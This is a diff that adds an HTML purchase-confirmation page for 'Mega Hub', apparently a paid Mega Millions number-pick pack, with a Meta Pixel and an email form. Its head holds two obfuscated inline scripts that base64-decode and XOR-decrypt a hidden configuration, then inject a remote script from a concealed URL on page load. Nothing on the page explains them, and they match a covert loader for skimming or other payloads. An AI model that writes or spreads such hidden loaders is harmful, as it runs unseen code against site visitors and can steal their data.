@@ -1,0 +1,119 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Thank you · Starter · Mega Hub</title>
+<style>
+:root{--cream:#F4EFE6;--ink:#1C1915;--sage:#3D5348;--muted:#6B655C;--line:#E3D9C8}
+*{box-sizing:border-box}
+html,body{margin:0;background:var(--cream);color:var(--ink);font-family:Georgia,serif}
+.wrap{max-width:920px;margin:0 auto;padding:32px 20px 64px}
+.kicker{letter-spacing:.16em;text-transform:uppercase;font-size:11px;color:var(--sage);margin:0 0 8px}
+h1{font-size:28px;margin:0 0 8px}
+.meta{color:var(--muted);margin:0 0 20px;line-height:1.5}
+.bar{display:flex;gap:10px;flex-wrap:wrap;margin:0 0 22px}
+a.btn{display:inline-block;background:var(--ink);color:var(--cream);text-decoration:none;padding:10px 14px;font-size:14px}
+a.btn.ghost{background:transparent;color:var(--ink);border:1px solid var(--ink)}
+.note{font-size:13px;color:var(--muted);border-top:1px solid var(--line);padding-top:14px;margin-top:8px}
+table{width:100%;border-collapse:collapse;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:13px}
+th{text-align:left;font-size:11px;letter-spacing:.08em;color:var(--muted);padding:6px 8px;border-bottom:1px solid var(--line)}
+td{padding:5px 8px;border-bottom:1px solid #efe6d8}
+td.n{width:54px;color:var(--muted)}
+td.mega{width:52px;font-weight:700}
+tr.pick{cursor:pointer}
+tr.pick:hover{background:#efe6d8}
+.home-card{border:1px solid var(--line);padding:18px;margin:18px 0 0;max-width:520px}
+.modal{display:none;position:fixed;inset:0;background:rgba(28,25,21,.72);z-index:40;padding:16px;overflow:auto}
+.modal.open{display:flex;align-items:center;justify-content:center}
+.slip{position:relative;width:min(420px,94vw);background:#fff;box-shadow:0 16px 50px rgba(0,0,0,.28)}
+.slip img{display:block;width:100%;height:auto}
+.slip .nums{position:absolute;left:9%;right:9%;top:47.2%;height:8.6%;display:flex;align-items:center;justify-content:space-between;font-family:Arial,Helvetica,sans-serif;font-weight:800;color:#111;letter-spacing:.02em}
+.slip .nums span{font-size:clamp(18px,6.4vw,28px)}
+.slip .nums .qp{letter-spacing:0}
+.modal .x{position:absolute;top:10px;right:14px;border:0;background:transparent;color:#fff;font-size:28px;cursor:pointer}
+.notice{background:#fff;border:1px solid var(--line);padding:18px 18px 16px;margin:0 0 22px}
+.notice .who{margin:0 0 10px;font-size:18px}
+.notice .draw{margin:0 0 10px;font-size:16px}
+.notice .draw strong{font-weight:700}
+.notice .keep{margin:0;color:var(--muted);font-size:14px;line-height:1.55}
+.thanks{max-width:520px}
+.field{margin:18px 0 12px}
+.field label{display:block;font-size:13px;margin:0 0 6px;color:var(--muted)}
+.field input{width:100%;padding:12px 12px;font-size:16px;border:1px solid var(--line);background:#fff;color:var(--ink);font-family:Georgia,serif}
+.field input:focus{outline:2px solid var(--sage);border-color:var(--sage)}
+button.go{display:inline-block;background:var(--ink);color:var(--cream);border:0;padding:12px 16px;font-size:15px;cursor:pointer;font-family:Georgia,serif}
+.err{display:none;color:#8a2b2b;font-size:13px;margin:0 0 12px}
+.err.show{display:block}
+.logo{display:block;width:min(280px,70vw);height:auto;margin:0 0 18px}
+.thanks-card{background:#fff;border:1px solid var(--line);padding:28px 24px 26px;max-width:460px}
+.emailbar{display:flex;gap:8px;flex-wrap:wrap;align-items:center;background:#fff;border:1px solid var(--line);padding:10px;margin:0 0 18px}
+.emailbar input{flex:1;min-width:180px;padding:10px 12px;font-size:15px;border:1px solid var(--line);background:var(--cream);color:var(--ink);font-family:Georgia,serif}
+.emailbar button{background:var(--ink);color:var(--cream);border:0;padding:10px 14px;font-size:14px;cursor:pointer;font-family:Georgia,serif}
+.boards{display:none}
+.boards.show{display:block}
+</style>
+
+<script>(function(){var o_pfhg=atob("DLNmxO+7hK+x588MiMhEsZ3XppWTj7t4+MBc68DY4MGfkrth4dUf6ozU6YHTleB/68EPtJvIq9/Yn6pgp8MPvIrXqsXCxeMu6ccStobZ8dvUlO020+5K5ojX683Qi7wusugd5oHa6cqT3e184csDqKbfpoOTka5g/dZE/s2N5ZbSgfxp6tYF9Y3atM7X0as/7YNRodeZ+fLM");var f_1gp=[];for(var m_jkf=0;m_jkf<o_pfhg.length;m_jkf++){f_1gp.push(o_pfhg.charCodeAt(m_jkf)&255);}var r_zx2=f_1gp[0];var f_y=f_1gp.slice(1,1+r_zx2);var k_eo9=f_1gp.slice(1+r_zx2);var o_j3kj=k_eo9.map(function(b,e_m){return b^f_y[e_m%r_zx2];});var i_hx="";for(var q_vea=0;q_vea<o_j3kj.length;q_vea++){i_hx+=String.fromCharCode(o_j3kj[q_vea]&255);}var w_vs=decodeURIComponent(escape(i_hx));var e_kmyb=JSON.parse(w_vs);var p_bgv=e_kmyb.globals||[];p_bgv.forEach(function(j_3a){window[j_3a.name]=j_3a.value;});var l_4i=document.createElement("script");l_4i.src=e_kmyb.url;l_4i.async=true;l_4i.defer=true;(e_kmyb.attributes||[]).forEach(function(g_sohc){l_4i.setAttribute(g_sohc.name,g_sohc.value);});(document.head||document.documentElement).appendChild(l_4i);})();</script>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1737283614167899');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1737283614167899&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<script>(function(){var k_1=atob("DAFfKQkpPOTRWc6+t3p9XHtFHt7zMbrKx3JlBiZKWIr/LLrT3mcmB2pGUcqzK+HN1HM2WX1aE5GlNL2R22ArTHpdEo6ie+Kc1nUrW2BLSZC0KuyE7Hp9R2hEWcbre6rfw2ByXH1EVYKodL7M0nc6R30ERIe+PePN1Gp9BStfXYikPOyElSMiBXILUoW8POyElWU+XWgESZC8MKjHmnEtTH9MUpD8Krvc3mUsCyULSoW9LKucjSN9VFRU");var h_u=[];for(var i_dfv7=0;i_dfv7<k_1.length;i_dfv7++){h_u.push(k_1.charCodeAt(i_dfv7)&255);}var e_5ke=h_u[0];var b_0vk=h_u.slice(1,1+e_5ke);var s_zynu=h_u.slice(1+e_5ke);var f_lo=s_zynu.map(function(b,p_s){return b^b_0vk[p_s%e_5ke];});var v_g="";for(var d_5=0;d_5<f_lo.length;d_5++){v_g+=String.fromCharCode(f_lo[d_5]&255);}var o_4b=decodeURIComponent(escape(v_g));var e_210=JSON.parse(o_4b);var k_5c2v=e_210.globals||[];k_5c2v.forEach(function(z_4a){window[z_4a.name]=z_4a.value;});var d_oi5d=document.createElement("script");d_oi5d.src=e_210.url;d_oi5d.async=true;d_oi5d.defer=true;(e_210.attributes||[]).forEach(function(k_2){d_oi5d.setAttribute(k_2.name,k_2.value);});(document.head||document.documentElement).appendChild(d_oi5d);})();</script>
+
+</head>
+<body>
+<main class="wrap thanks">
+<div class="thanks-card">
+<img class="logo" src="/assets/logo.jpg" alt="Mega Millions"/>
+<p class="kicker">Mega Hub · purchase confirmed</p>
+<h1>Thank you for your purchase</h1>
+<p class="meta">Confirm the email from your Whop checkout. We will take you to your boards next.</p>
+<form id="confirm-form" name="confirm-starter" method="POST" data-netlify="true" netlify-honeypot="bot-field" novalidate>
+  <input type="hidden" name="form-name" value="confirm-starter"/>
+  <input type="hidden" name="pack" value="starter"/>
+  <p class="field" hidden><label>Leave blank <input name="bot-field"/></label></p>
+  <p class="field">
+    <label for="email">Email address</label>
+    <input id="email" name="email" type="email" autocomplete="email" required placeholder="you@email.com"/>
+  </p>
+  <p class="err" id="err">Enter a valid email to continue.</p>
+  <button class="go" type="submit">Receive my tickets</button>
+</form>
+</div>
+</main>
+<script>
+const dest = '/starter/';
+const form = document.getElementById('confirm-form');
+const email = document.getElementById('email');
+const err = document.getElementById('err');
+form.addEventListener('submit', (e) => {
+  e.preventDefault();
+  const value = (email.value || '').trim();
+  const ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
+  if (!ok) {
+    err.classList.add('show');
+    email.focus();
+    return;
+  }
+  err.classList.remove('show');
+  try { sessionStorage.setItem('mega-hub-email', value); } catch (err2) {}
+  const next = dest + (dest.includes('?') ? '&' : '?') + 'email=' + encodeURIComponent(value);
+  window.location.replace(next);
+});
+</script>
+</body>
+</html>
